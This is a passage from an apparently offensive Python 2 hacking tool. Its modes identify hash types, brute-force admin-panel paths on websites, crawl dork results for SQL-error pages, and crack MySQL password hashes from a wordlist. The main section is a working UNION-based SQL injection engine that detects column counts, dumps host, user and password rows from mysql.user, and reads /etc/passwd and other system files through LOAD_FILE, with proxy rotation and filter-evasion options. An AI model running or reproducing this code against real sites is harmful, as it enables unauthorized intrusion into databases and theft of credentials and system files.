    ADLER32(); CRC16(); CRC16CCITT(); CRC32(); CRC32B(); DESUnix(); DomainCachedCredentials(); FCS16(); GHash323(); GHash325(); GOSTR341194(); Haval128(); Haval128HMAC(); Haval160(); Haval160HMAC(); Haval192(); Haval192HMAC(); Haval224(); Haval224HMAC(); Haval256(); Haval256HMAC(); LineageIIC4(); MD2(); MD2HMAC(); MD4(); MD4HMAC(); MD5(); MD5APR(); MD5HMAC(); MD5HMACWordpress(); MD5phpBB3(); MD5Unix(); MD5Wordpress(); MD5Half(); MD5Middle(); MD5passsaltjoomla1(); MD5passsaltjoomla2(); MySQL(); MySQL5(); MySQL160bit(); NTLM(); RAdminv2x(); RipeMD128(); RipeMD128HMAC(); RipeMD160(); RipeMD160HMAC(); RipeMD256(); RipeMD256HMAC(); RipeMD320(); RipeMD320HMAC(); SAM(); SHA1(); SHA1Django(); SHA1HMAC(); SHA1MaNGOS(); SHA1MaNGOS2(); SHA224(); SHA224HMAC(); SHA256(); SHA256s(); SHA256Django(); SHA256HMAC(); SHA256md5pass(); SHA256sha1pass(); SHA384(); SHA384Django(); SHA384HMAC(); SHA512(); SHA512HMAC(); SNEFRU128(); SNEFRU128HMAC(); SNEFRU256(); SNEFRU256HMAC(); Tiger128(); Tiger128HMAC(); Tiger160(); Tiger160HMAC(); Tiger192(); Tiger192HMAC(); Whirlpool(); WhirlpoolHMAC(); XOR32(); md5passsalt(); md5saltmd5pass(); md5saltpass(); md5saltpasssalt(); md5saltpassusername(); md5saltmd5pass(); md5saltmd5passsalt(); md5saltmd5passsalt(); md5saltmd5saltpass(); md5saltmd5md5passsalt(); md5username0pass(); md5usernameLFpass(); md5usernamemd5passsalt(); md5md5pass(); md5md5passsalt(); md5md5passmd5salt(); md5md5saltpass(); md5md5saltmd5pass(); md5md5usernamepasssalt(); md5md5md5pass(); md5md5md5md5pass(); md5md5md5md5md5pass(); md5sha1pass(); md5sha1md5pass(); md5sha1md5sha1pass(); md5strtouppermd5pass(); sha1passsalt(); sha1saltpass(); sha1saltmd5pass(); sha1saltmd5passsalt(); sha1saltsha1pass(); sha1saltsha1saltsha1pass(); sha1usernamepass(); sha1usernamepasssalt(); sha1md5pass(); sha1md5passsalt(); sha1md5sha1pass(); sha1sha1pass(); sha1sha1passsalt(); sha1sha1passsubstrpass03(); sha1sha1saltpass(); sha1sha1sha1pass(); sha1strtolowerusernamepass()
    if len(jerar)==0:
	 print "----------"
	 print "NOT FOUND" ;file.write( hash +'Not Found')

	 print "----------"
	 sys.exit(1)
	
    elif len(jerar)>2:
        jerar.sort()
        print "----------------"
        print "POSSIBLE HASHES:" ;file.write( "HASH IS : "+hash + " : \nPOSSIBLE HASHES:")
 
        print "----------------" ;file.write(' \n -------------------')
        print "[+] ",algorithms[jerar[0]] ;file.write( "\n[+] "+algorithms[jerar[0]])
        print "[+] ",algorithms[jerar[1]] ;file.write( "\n[+] "+algorithms[jerar[1]])
        print "" ; sys.exit(1)
		
    else:
        jerar.sort()
        print "----------------"
        print "POSSIBLE HASHES:" ;file.write( hash +" :\nPOSSIBLE HASHES:")
		
        print "----------------"
        for a in range(len(jerar)):
            print "[+] ",algorithms[jerar[a]] ;file.write( "\n [+] "+algorithms[jerar[a]])
        sys.exit(1)	   
if mode == "--php" :
        site = site.replace('https://','') 
        site = site.replace('http://','')
        try:
          print ("\t[+] CHECKING WEBSITE " + site + "...")
          conn = httplib.HTTPConnection(site)
          conn.connect()
          print "\t[!] YES ^_^ ... SERVER Is Online."
        except (httplib.HTTPResponse, socket.error) as Exit:
           print "\t [!] Error >_< , SERVER IS Offline Or Invalid URL"
           sys.exit(1)
		   
        print("\t [+] Scanning " + site + "...\n\n") ;file.write("\t [+] Scanning " + site + "...\n\n")
        for admin in php:
            admin = admin.replace("\n","")
            admin = "/" + admin
            host = site + admin
			 
            
            print ("\t [+] Checking " + host + "...")
            connection = httplib.HTTPConnection(site)
            connection.request("GET",admin)
            response = connection.getresponse()
            var2 = var2 + 1
            if response.status == 200:
                var1 = var1 + 1
                print ( "\n\n >>> " + host, " Admin Panel Found! ^_^ ") ; file.write( "\n\n>>>" + host+ " Admin Panel Found!")
                raw_input("Press ENTER To Continue ....\n")
            elif response.status == 404:
                var2 = var2
            elif response.status == 302:
                print "\n >>> " + host, " Possible Admin Panel (302 - Redirect)" ;file.write( "\n\n>>>" + host+ " Possible Admin Panel (302 - Redirect)")
            else:
                print (host, " Interesting Response:", response.status)
            connection.close()
        print("\n\n TH3  END \n")
        print " Admin Panels found : " ,var1
        print " Total Pages Scanned : " ,var2
        sys.exit(1)	   
if mode == "--l":	
    ADLER32(); CRC16(); CRC16CCITT(); CRC32(); CRC32B(); DESUnix(); DomainCachedCredentials(); FCS16(); GHash323(); GHash325(); GOSTR341194(); Haval128(); Haval128HMAC(); Haval160(); Haval160HMAC(); Haval192(); Haval192HMAC(); Haval224(); Haval224HMAC(); Haval256(); Haval256HMAC(); LineageIIC4(); MD2(); MD2HMAC(); MD4(); MD4HMAC(); MD5(); MD5APR(); MD5HMAC(); MD5HMACWordpress(); MD5phpBB3(); MD5Unix(); MD5Wordpress(); MD5Half(); MD5Middle(); MD5passsaltjoomla1(); MD5passsaltjoomla2(); MySQL(); MySQL5(); MySQL160bit(); NTLM(); RAdminv2x(); RipeMD128(); RipeMD128HMAC(); RipeMD160(); RipeMD160HMAC(); RipeMD256(); RipeMD256HMAC(); RipeMD320(); RipeMD320HMAC(); SAM(); SHA1(); SHA1Django(); SHA1HMAC(); SHA1MaNGOS(); SHA1MaNGOS2(); SHA224(); SHA224HMAC(); SHA256(); SHA256s(); SHA256Django(); SHA256HMAC(); SHA256md5pass(); SHA256sha1pass(); SHA384(); SHA384Django(); SHA384HMAC(); SHA512(); SHA512HMAC(); SNEFRU128(); SNEFRU128HMAC(); SNEFRU256(); SNEFRU256HMAC(); Tiger128(); Tiger128HMAC(); Tiger160(); Tiger160HMAC(); Tiger192(); Tiger192HMAC(); Whirlpool(); WhirlpoolHMAC(); XOR32(); md5passsalt(); md5saltmd5pass(); md5saltpass(); md5saltpasssalt(); md5saltpassusername(); md5saltmd5pass(); md5saltmd5passsalt(); md5saltmd5passsalt(); md5saltmd5saltpass(); md5saltmd5md5passsalt(); md5username0pass(); md5usernameLFpass(); md5usernamemd5passsalt(); md5md5pass(); md5md5passsalt(); md5md5passmd5salt(); md5md5saltpass(); md5md5saltmd5pass(); md5md5usernamepasssalt(); md5md5md5pass(); md5md5md5md5pass(); md5md5md5md5md5pass(); md5sha1pass(); md5sha1md5pass(); md5sha1md5sha1pass(); md5strtouppermd5pass(); sha1passsalt(); sha1saltpass(); sha1saltmd5pass(); sha1saltmd5passsalt(); sha1saltsha1pass(); sha1saltsha1saltsha1pass(); sha1usernamepass(); sha1usernamepasssalt(); sha1md5pass(); sha1md5passsalt(); sha1md5sha1pass(); sha1sha1pass(); sha1sha1passsalt(); sha1sha1passsubstrpass03(); sha1sha1saltpass(); sha1sha1sha1pass(); sha1strtolowerusernamepass()
    if len(jerar)==0:
	 print "----------"
	 print "NOT FOUND" ;file.write( hash +'Not Found')

	 print "----------"
	 
    elif len(jerar)>2:
          jerar.sort() 
          print ' ----------------------' 
          print ' LEAST POSSIBLE HASHES : ' ;file.write( 'HASH IS : '+hash + " : \nLEAST POSSIBLE HASHES:\n")
          print ' ----------------------'   ;file.write( '---------------------------\n')
          for a in range(int(len(jerar))-2):
            print "[+] ",algorithms[jerar[a+2]]	  	
            file.write( "[+] "+algorithms[jerar[a+2]] )
            file.write('\n')
    sys.exit(1)	
if mode == "--asp" :
       site = site.replace('https://','') ;site = site.replace('http://','')
        
       try:
          print ("\t[+] CHECKING WEBSITE " + site + "...") 
          conn = httplib.HTTPConnection(site)
          conn.connect()
          print "\t[!] YES ^_^ ... SERVER Is Online."
       except (httplib.HTTPResponse, socket.error) as Exit:
           print "\t [!] Error >_< , SERVER IS Offline Or Invalid URL"
           sys.exit(1)
	    
       print("\t [+] Scanning " + site + "...\n\n") ;file.write("\t [+] Scanning " + site + "...\n\n")
       for admin in asp:
            admin = admin.replace("\n","")
            admin = "/" + admin
            host = site + admin
            
            print ("\t [+] Checking " + host + "...")
            connection = httplib.HTTPConnection(site)
            connection.request("GET",admin)
            response = connection.getresponse()
            var2 = var2 + 1
            if response.status == 200: 
                var1 = var1 + 1
                print ( "\n\n >>>" + host, "Admin Panel Found!") ;file.write( "\n\n>>>" + host+ " Admin Panel Found!")
                raw_input("Press ENTER To Continue ....\n")
            elif response.status == 404:
                var2 = var2
            elif response.status == 302:
                print ("\n >>>" + host, "Possible Admin Panel (302 - Redirect)") ;file.write( "\n\n>>>" + host+ " Possible Admin Panel (302 - Redirect)")
            else:
                print (host, " Interesting Response:", response.status)
            connection.close()
       print("\n\n TH3  END \n")
       print " Admin Panels found : " ,var1
       print " Total Pages Scanned : " ,var2
       sys.exit(1)	
if mode == "--cfm":
        site = site.replace('https://','') ;site = site.replace('http://','')
        try:
          print ("\t[+] CHECKING WEBSITE " + site + "...")
          conn = httplib.HTTPConnection(site)
          conn.connect()
          print "\t[!] YES ^_^ ... SERVER Is Online."
        except (httplib.HTTPResponse, socket.error) as Exit:
           print "\t [!] Error >_< , SERVER IS Offline Or Invalid URL"
           sys.exit(1)
		 	
		
	    
        print("\n [+] Scanning " + site + "...\n\n") ;file.write("\t [+] Scanning " + site + "...\n\n")
        for admin in cfm:
            admin = admin.replace("\n","")
            admin = "/" + admin
            host = site + admin
            print ("\t [+] Checking " + host + "...")
            connection = httplib.HTTPConnection(site)
            connection.request("GET",admin)
            response = connection.getresponse()
            var2 = var2 + 1
            if response.status == 200:
                var1 = var1 + 1
                print ( "\n\n>>>" + host, "Admin Panel Found!") ;file.write( "\n\n>>>" + host+ " Admin Panel Found!")
                raw_input("Press ENTER To Continue .....\n")
            elif response.status == 404:
                var2 = var2
            elif response.status == 302:
                print ("\n>>>"+host,"Possible Admin Penel (302 - Redirect)") ;file.write( "\n\n>>>" + host+ " Possible Admin Panel (302 - Redirect)")
            else:
                print ( host," Interesting response:", response.status)
            connection.close()
        print("\n\n TH3  END \n")
        print " Admin Panels found : " ,var1
        print " Total Pages Scanned : " ,var2
        sys.exit(1)
if mode == "--cgi":
        site = site.replace('https://','') ;site = site.replace('http://','')
        try:
          print ("\t[+] CHECKING WEBSITE " + site + "...")
          conn = httplib.HTTPConnection(site)
          conn.connect()
          print "\t[!] YES ^_^ ... SERVER Is Online."
        except (httplib.HTTPResponse, socket.error) as Exit:
           print "\t [!] Error >_< , SERVER IS Offline Or Invalid URL"
           sys.exit(1)
		 	
		
	    
        print("\n [+] Scanning " + site + "...\n\n") ;file.write("\t [+] Scanning " + site + "...\n\n")
        for admin in cgi:
            admin = admin.replace("\n","")
            admin = "/" + admin
            host = site + admin
            print ("\t [+] Checking " + host + "...")
            connection = httplib.HTTPConnection(site)
            connection.request("GET",admin)
            response = connection.getresponse()
            var2 = var2 + 1
            if response.status == 200:
                var1 = var1 + 1
                print ( "\n\n>>>" + host, "Admin Panel Found!") ;file.write( "\n\n>>>" + host+ " Admin Panel Found!")
                raw_input("Press ENTER To Continue .....\n")
            elif response.status == 404:
                var2 = var2
            elif response.status == 302:
                print ("\n>>>"+host,"Possible Admin Penel (302 - Redirect)") ;file.write( "\n\n>>>" + host+ " Possible Admin Panel (302 - Redirect)")
            else:
                print ( host," Interesting response:", response.status)
            connection.close()
        print("\n\n TH3  END \n")
        print " Admin Panels found : " ,var1
        print " Total Pages Scanned : " ,var2
        sys.exit(1)
if mode == "--brf":
        site = site.replace('https://','') ;site = site.replace('http://','') 
        try:
          print ("\t[+] CHECKING WEBSITE " + site + "...")
          conn = httplib.HTTPConnection(site)
          conn.connect()
          print "\t[!] YES ^_^ ... SERVER Is Online."
        except (httplib.HTTPResponse, socket.error) as Exit:
           print "\t [!] Error >_< , SERVER IS Offline Or Invalid URL"
           sys.exit(1)
		   
        print("\n [+] Scanning " + site + "...\n\n") ;file.write("\t [+] Scanning " + site + "...\n\n")
        for admin in brf:
            admin = admin.replace("\n","")
            admin = "/" + admin
            host = site + admin
            print ("\t [#] Checking " + host + "...")
            connection = httplib.HTTPConnection(site)
            connection.request("GET",admin)
            response = connection.getresponse()
            var2 = var2 + 1
            if response.status == 200:
                var1 = var1 + 1
                print ( "\n\n>>>" + host, "Admin Panel Found!") ;file.write( "\n\n>>>" + host+ "Admin Panel Found!")
                raw_input("Press Enter To Continue ....\n")
            elif response.status == 404:
                var2 = var2
            elif response.status == 302:
                print ("\n>>>" + host, "Possible Admin Panel (302 - Redirect)") ;file.write( "\n\n>>>" + host+ " Possible Admin Panel (302 - Redirect)")
            else:
                print (host, " Interesting Response:", response.status)
            connection.close()
        print("\n\n  TH3  END \n")
        print " Admin Panels found : " ,var1
        print " Total Pages Scanned : " ,var2
        sys.exit(1)
if mode == "--a":
    
    print " \tSCANNING "+ip+"  IS START WITH DORK  ... " ;file.write("\nSCANNING "+ip+" IS START WITH DORK .. ")
    print " \t\tGET ALL LINKS : "
    print " \n\t\t\tPlease wait ..."
    try : 
       Hajar()
    except (urllib2.HTTPError,socket.timeout,socket.error):
         print '	Session Cancelled  !!  Check   Your internet settings '
         sys.exit(1)
    for reb in Muslim :
      if '=' in reb :
         RebelG.append(reb)
    print '---------------------------------------------------------------------------' ;file.write('\n--------------------------------------------')
    print '{!} Number Links Finding with  Your Dork  in Your IP Is :',len(RebelG),'(+)' ;file.write('\n This  is  All Links Finding with Your Dork') 
    print '---------------------------------------------------------------------------' ;file.write('\n--------------------------------------------')
    while x <len(RebelG):
         print '[+]',RebelG[x] ;file.write("\n[+]"+RebelG[x])
         x=x+1
    sys.exit(1)
if mode == "--v":
    
    
    print " \tSCANNING "+ip+"  IS START WITH DORK  ..." ;file.write("\nSCANNING "+ip+" IS START WITH DORK .. ")
    print " \t\tGET JUST VULN LINKS :  " 
    print " \n\t\t\tPLease Wait .... " 
    try : 
       Hajar()
    except (urllib2.HTTPError,socket.timeout,socket.error):
         print '	Session Cancelled  !!  Check   Your internet settings '
         sys.exit(1)
    for reb in Muslim :
      if '=' in reb :
         RebelG.append(reb)
         
    print ' \t\t\tNumber Of All Links is >>>  ',len(RebelG)
    while a<len(RebelG):
      try:
        print " \t\t\t\t\tScanning " ,a+1,'Link'
        Test = urllib2.urlopen(RebelG[a]+"'")
        source = Test.read()
        if "MySQL"  in source or "mysql"  in source or "SQL"  in source or "pas de rubrique acc&eacute;ssible"  in source or "OLE DB"  in source or "Syntax error"  in source or "GetArray"  in source or "FetchRow"  in source or "string was"  in source or "VBScript"  in source or "mssql"  in source or "JET Database"  in source or "ODBC Microsoft"  in source or "oci_parse"  in source or "pg_query"  in source or "ybase_query"  in source or "ibase_query"  in source:
          Y.append(RebelG[a])
      except (urllib2.HTTPError,socket.timeout,urllib2.URLError):
        RebelG.pop(a)
      a=a+1
    print '------------------------------------------------------------------------' ;file.write('\n----------------------------------------------')
    print '{!} Number Links Vuln (SQLi) 100% In Your Server Is  :',len(Y),'(+)'      ;file.write('\n This is Links Vuln (SQLi) 100% In Your Server')
    print '------------------------------------------------------------------------' ;file.write('\n----------------------------------------------')
    while b<len(Y) :
       print '[+]',Y[b] ;file.write("\n[+]"+Y[b])
       b=b+1
    sys.exit()
if mode == "-h":
	hashvalue = arg
	configureCookieProcessor()
	seed()
	cracked = 0
	cracked = crackHash (algorithm, hashvalue, hashfile)
	if not cracked and googlesearch and not hashfile:
	    searchHash (hashvalue)
	sys.exit()		
if mode != "--crack" and site == "":
        print "[-] URL is required!\n[-] Need Help? --help\n"
        sys.exit(1)
if mode == "None":
        print "[-] Mode is required!\n[-] Need Help? --help\n"
        sys.exit(1)
if mode == "--schema" and arg_database == "None":
        print "[-] Must include -D flag!\n[-] Need Help? --help\n"
        sys.exit(1)
if mode == "--dump":
        if arg_table == "None" or arg_columns == "None":
                print "[-] Must include -T and -C flag. -D is Optional\n[-] Need Help? --help\n"
                sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if arg_ssl == "off":
        if site[:4] != "http": 
                site = "http://"+site
else:
        if site[:5] != "https":
                site = "https://"+site
if site.endswith("/*"):
	site = site.rstrip('/*')
if site.endswith("--"):
	site = site.rstrip('--')
if arg_cookie != "None":
        try:
                cj = cookielib.MozillaCookieJar()
                cj.load(arg_cookie)
                cookie_handler = urllib2.HTTPCookieProcessor(cj)
        except:
                print "[!] There was a problem loading your cookie file!"
                print "[!] Make sure the cookie file is in Mozilla Cookie File Format!"
                print "[!] http://xiix.wordpress.com/2006/03/23/mozillafirefox-cookie-format/\n"
                sys.exit(1)
else:
        cookie_handler = urllib2.HTTPCookieProcessor()
if mode != "--findcol" and arg_blind != "--blind" and mode != "--crack" and site.find("MECA") == -1: 
	print "[-] Site must contain \'MECA\'\n" 
	sys.exit(1)
if arg_blind == "--blind" and arg_string == "":
        print "[-] You must specify a --string when using blind methodology.\n"
        sys.exit(1)
if arg_columns != "None":
        arg_columns = arg_columns.split(",")
if arg_insert != "None":
        arg_insert = arg_insert.split(",")
if mode == "--crack" and arg_wordlist == "":
        print "[-] You must specify a --wordlist to crack with.\n"
        sys.exit(1)
agent = random.choice(USER_AGENTS)

if mode == "--crack":
        try: 
                arg_wordlist = open(arg_wordlist, "r") 
        except(IOError): 
                print "[-] Error: Check your wordlist path\n";file.write("\n[-] Error: Check your wordlist path\n")
                sys.exit(1)
        if len(arg_hash) != 40 and len(arg_hash) != 16: 
                print "\n[-] Improper hash length\n";file.write("\n\n[-] Improper hash length\n")
                sys.exit(1)
        arg_wordlist = arg_wordlist.readlines() 
        print "[+] Words Loaded:",len(arg_wordlist);file.write("\n[+] Words Loaded: "+str(len(arg_wordlist)))
        if len(arg_hash) == 40:
                print "[+] Detected MySQL v5 Hash:",arg_hash;file.write("\n[+] Detected MySQL v5 Hash: "+arg_hash)
                try: 
                        import hashlib 
                        for word in arg_wordlist: 
                                if arg_hash == c1(word): 
                                        print "\n[!] Password is:",word;file.write("\n\n[!] Password is: "+word)
                                        break
                except(ImportError): 
                        import sha 
                        for word in arg_wordlist: 
                                if arg_hash == c2(word): 
                                        print "\n[!] Password is:",word;file.write("\n\n[!] Password is: "+word)
                                        break
        else:
                print "[+] Detected MySQL v4 Hash:",arg_hash
                print "[+] Try MECA hash database @ "
                for word in arg_wordlist:
                        word = word.rstrip("\n")
                        if arg_hash == mysql323(word): 
                                print "\n[!] Password is:",word+"\n";file.write("\n\n[!] Password is: "+word+"\n")
                                break
        print "[-] Finished Searching..\n[-] Done\n";file.write("\n[-] Finished Searching..\n[-] Done\n")
        sys.exit(1)
        

print "[+] URL:",site;file.write("\n\n[+] URL: "+site)
print "[+] %s" % time.strftime("%X");file.write("\n[+] %s" % time.strftime("%X"))
print "[+] Evasion:",arg_eva,arg_end;file.write("\n[+] Evasion: "+arg_eva+" "+arg_end)
print "[+] Cookie:", arg_cookie;file.write("\n[+] Cookie: "+arg_cookie)
if site[:5] == "https":
        print "[+] SSL: Yes";file.write("\n[+] SSL: Yes")
else:
        print "[+] SSL: No";file.write("\n[+] SSL: No")
print "[+] Agent:",agent;file.write("\n[+] Agent: "+agent)
        

proxy_list = [];proxy_list_count = []
if proxy != "None":
    print "[+] Building Proxy List...";file.write("\n[+] Building Proxy List...")
    for p in proxy:
        
        try:
                match = re.findall(":",p)
                if len(match) == 3:
                    arg_proxy_auth = []
                    prox = p.split(":")
                    arg_proxy_auth += prox
                if arg_proxy_auth != "":
                    proxy_auth_handler = urllib2.HTTPBasicAuthHandler()
                    proxy_auth_handler.add_password("none",p,arg_proxy_auth[2],arg_proxy_auth[3])
                    opener = urllib2.build_opener(proxy_auth_handler)
                    opener.open("http://www.google.com")
                    proxy_list.append(urllib2.build_opener(proxy_auth_handler, cookie_handler))
                    proxy_list_count.append(p);arg_proxy_auth = ""
                else:
                    proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
                    opener = urllib2.build_opener(proxy_handler)
                    opener.open("http://www.google.com")
                    proxy_list.append(urllib2.build_opener(proxy_handler, cookie_handler))
                    proxy_list_count.append(p)
                if len(match) == 3 or len(match) == 1:
                    print "\tProxy:",p,"- Success";file.write("\n\tProxy:"+p+" - Success")
                else:
                    print "\tProxy:",p,arg_proxy_auth[2]+":"+arg_proxy_auth[3]+"- Success";file.write("\n\tProxy:"+p+" - Success")
        except:
            print "\tProxy:",p,"- Failed [ERROR]:",sys.exc_info()[0];file.write("\n\tProxy:"+p+" - Failed [ERROR]: "+str(sys.exc_info()[0]))
            pass
    if len(proxy_list) == 0:
        print "[-] All proxies have failed. App Exiting"
        sys.exit(1) 
    print "[+] Proxy List Complete";file.write("\n[+] Proxy List Complete")
else:
	print "[-] Proxy Not Given";file.write("\n[+] Proxy Not Given")
	proxy_list.append(urllib2.build_opener(cookie_handler))

	proxy_list_count.append("None")
proxy_num = 0
proxy_len = len(proxy_list)

## Blind String checking!
if arg_blind == "--blind":
        print "[!] Blind Methodology will be used!";file.write("\n[!] Blind Methodology will be used!")
        head_URL = site+"+AND+1=1"
        source = GetThatShit(head_URL)
        match = re.findall(arg_string,source)
        if len(match) >= 2:
                print "\n[-] The String you used has been found on the target page in-use more than 2 times"
                print "[-] This might lead to false positives with the blind methodology"
                print "[-] Might not mean anything.. I am just trying to help out.."
                print "[-] If you have problems you might know why.. ;-)\n"
        if len(match) == 0:
                print "\n[-] The String you used has not been found in the target URL!\n[-] Please try another.\n[-] Done.\n"
                sys.exit(1)
        if len(match) == 1:
                print "[+] Blind String Selected is Good ;-)";file.write("\n[+] Blind String Selected is Good ;-)")
                

if mode == "--findcol":
        print "[+] Attempting To find the number of columns...";file.write("\n[+] Attempting To find the number of columns...")
        print "[+] Testing: ",
        file.write("\n[+] Testing: ",)
        checkfor=[];nullFound=[];nullnum=[];makepretty = ""
        sitenew = site+"+AND+1=2+UNION+SELECT+"
        for x in xrange(1,colMax):
                try:
                        sys.stdout.write("%s," % (x))
                        file.write(str(x)+",")
                        sys.stdout.flush()
                        MECA = "dark"+str(x)+"code"
                        checkfor.append(MECA)  
                        if x > 1: 
                                sitenew += ","
                        sitenew += "0x"+MECA.encode("hex")	
                        finalurl = sitenew+arg_end
                        source = GetThatShit(finalurl)
                        for y in checkfor:
                                colFound = re.findall(y,source)
                                if len(colFound) != 0:
                                        nullFound.append(colFound[0])
                        if len(nullFound) >= 1:
                                print "\n[+] Column Length is:",len(checkfor);file.write("\n[+] Column Length is: "+str(len(checkfor)))
                                print "[+] Found null column at column #: ",;file.write("\n[+] Found null column at column #: ",)
                                for z in nullFound:
                                        nullcol = re.findall(("\d+"),z)
                                        nullnum.append(nullcol[0])
                                        sys.stdout.write("%s," % (nullcol[0]))
                                        file.write(str(nullcol[0])+",")
                                        sys.stdout.flush()
                                for z in xrange(0,len(checkfor)):
                                        z+=1
                                        if z > 1:
                                                makepretty += ","
                                        makepretty += str(z)
                                site = site+arg_eva+"AND"+arg_eva+"1=2"+arg_eva+"UNION"+arg_eva+"SELECT"+arg_eva+makepretty+arg_end
                                print "\n\n[!] SQLi URL:",site;file.write("\n\n[!] SQLi URL: "+site)
                                for z in nullnum:
                                        site = site.replace("+"+z+",","+MECA,")
                                        site = site.replace(","+z+",",",MECA,")
                                        site = site.replace(","+z+arg_end,",MECA"+arg_end)
                                print "[!] PRO_INJECTOR URL:",site;file.write("\n[!] PRO_INJECTOR URL: "+site)
                                print "\n[-] %s" % time.strftime("%X");file.write("\n\n[-] [%s]" % time.strftime("%X"))
                                print "[-] Total URL Requests:",gets;file.write("\n[-] Total URL Requests: "+str(gets))
                                print "[-] Done\n";file.write("\n[-] Done\n")
                                
                                file.close();sys.exit(1)
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
                        
        print "\n[!] Sorry Column Length could not be found."
        file.write("\n[!] Sorry Column Length could not be found.")
        print "[-] You might try to change colMax variable or change evasion option.. or last but not least do it manually!"
        print "[-] Done\n"
        sys.exit(1)


if arg_blind != "--blind":
        head_URL = site.replace("MECA","concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
        print "[+] Gathering MySQL Server Configuration...";file.write("\n[+] Gathering MySQL Server Configuration...\n")
        source = GetThatShit(head_URL)
        match = re.findall("\x1e\x1e\S+",source)
        if len(match) >= 1: 
                match = match[0][0:].split("\x1e")
                version = match[2]
                user = match[3]
                database = match[4]
                print "\tDatabase:", database;file.write("\tDatabase: "+database+"\n")
                print "\tUser:", user;file.write("\tUser: "+user+"\n")
                print "\tVersion:", version;file.write("\tVersion: "+version)
        else:
                print "\n[-] There seems to be a problem with your URL. Please check and try again.\n[DEBUG]:",head_URL.replace("+",arg_eva),"\n"
                sys.exit(1)
else:
        print "[+] Preforming Quick MySQL Version Check...";file.write("\n[+] Preforming Quick MySQL Version Check...")
        while 1:
                config_URL = site+"+and+substring(@@version,1,1)="+str(ser_ver)
                source = GetThatShit(config_URL)
                match = re.findall(arg_string,source)
                if len(match) >= 1:
                        print "\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!";file.write("\n\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!")
                        version += str(ser_ver)
                        break
                if ser_ver == 6:
                        print "[-] Was unable to determine MySQL version.\n[-] Done"
                        sys.exit(1)
                ser_ver+=1
                

if mode == "--schema" or mode == "--dbs" or mode == "--full":
        if version[0] == str(4):
                print "\n[-] Mode Selected is incompatible with MySQL v4 Servers"
                print "[-] -h for help"
                sys.exit(1)

if mode == "--info" and arg_blind != "--blind":
        head_URL = site.replace("MECA","0x"+"MECA".encode("hex"))+"+FROM+mysql.user"+arg_end
        source = GetThatShit(head_URL)
        match = re.findall("MECA",source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to MySQL Database:",yesno;file.write("\n\n[+] Do we have Access to MySQL Database: "+str(yesno))
        if yesno == "YES <-- w00t w00t":
                print "\n[+] Dumping MySQL user info. host:user:password";file.write("\n\n[+] Dumping MySQL user info. host:user:password")
                head_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")+"+FROM+mysql.user"+arg_end
                source = GetThatShit(head_URL)
                match = re.findall("\x1e\x1e\S+",source);match = match[0].strip("\x1e").split("\x1e");userend = match[0]
                print "[+] Number of users in the mysql.user table:",userend;file.write("[+] Number of users in the mysql.user table: "+str(userend))
                head_URL = site.replace("MECA","concat(0x1e,0x1e,host,0x1e,user,0x1e,password,0x1e,0x20)")
                head_URL = head_URL+"+FROM+mysql.user+LIMIT+NUM,1"+arg_end
                for x in range(0,int(userend)):
                        try: 
                                source = GetThatShit(head_URL.replace("NUM",str(x)))
                                match = re.findall("\x1e\x1e\S+",source)
                                match = match[0].strip("\x1e").split("\x1e")
                                if len(match) != 3:
                                        nullvar = "NULL"
                                        match += nullvar
                                print "\t["+str(x)+"]",match[0]+":"+match[1]+":"+match[2];file.write("\n["+str(x)+"] "+str(match[0])+":"+str(match[1])+":"+str(match[2]))
                        except (KeyboardInterrupt, SystemExit):
                                raise
                        except:
                                pass
        else:
                print "\n[-] MySQL user enumeration has been skipped!\n[-] We do not have access to mysql DB on this target!"
                file.write("\n\n[-] MySQL user enumeration has been skipped!\n[-] We do not have access to mysql DB on this target!")
        head_URL = site.replace("MECA","concat(load_file(0x2f6574632f706173737764),0x3a,0x6461726b63306465)")+arg_end
        source = GetThatShit(head_URL)
        match = re.findall("MECA",source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to Load_File:",yesno;file.write("\n\n[+] Do we have Access to Load_File: "+str(yesno))
        if yesno == "YES <-- w00t w00t":
                fuzz_load = open(loadfilefuzz, "r").readlines()
                head_URL = site.replace("MECA","concat(load_file('%2Fetc%2Fpasswd'),0x3a,0x6461726b63306465)")+arg_end
                source = GetThatShit(head_URL)
                match = re.findall("MECA",source)
                if len(match) > 1:
                        onoff = "OFF <-- w00t w00t"
                else:
                        onoff = "ON"		
                print "\n[+] Magic quotes are:",onoff
                yesno = str(raw_input("\n[!] Would You like to fuzz LOAD_FILE (Yes/No): "))
                if yesno == "Y" or yesno == "y" or yesno == "Yes" or yesno == "yes":
                        print "\n[+] Starting Load_File Fuzzer...";file.write("\n\n[+] Starting Load_File Fuzzer...")
                        print "[+] Number of system files to be fuzzed:",len(fuzz_load),"\n";file.write("\n[+] Number of tables names to be fuzzed: "+str(len(fuzz_load))+"\n")
                        for sysfile in fuzz_load:
                                sysfile = sysfile.rstrip("\n")
                                if proxy != "None":
                                        sysfile = sysfile.replace("/","%2F")
                                        sysfile = sysfile.replace(".","%2E")
                                if onoff == "OFF <-- w00t w00t":
                                        head_URL = site.replace("MECA","concat(LOAD_FILE(\'"+sysfile+"\'),0x3a,0x6461726b63306465)")+arg_end
                                else:
                                        head_URL = site.replace("MECA","concat(LOAD_FILE(0x"+sysfile.encode("hex")+"),0x3a,0x6461726b63306465)")+arg_end
                                source = GetThatShit(head_URL)
                                match = re.findall("MECA",source)
                                if len(match) > 0:
                                    print "[!] Found",sysfile;file.write("\n[!] Found "+sysfile)
                                    head_URL = head_URL.replace("concat(","")
                                    head_URL = head_URL.replace(",0x3a,0x6461726b63306465)","")
                                    print "[!]",head_URL;file.write("\n[!] "+head_URL)
        else:
                print "\n[-] Load_File Fuzzer has been by skipped!\n[-] Load_File disabled on this target!"
                file.write("\n\n[-] Load_File Fuzzer has been by skipped!\n[-] Load_File disabled on this target!")        

if mode == "--fuzz":
        fuzz_tables = open(tablefuzz, "r").readlines()
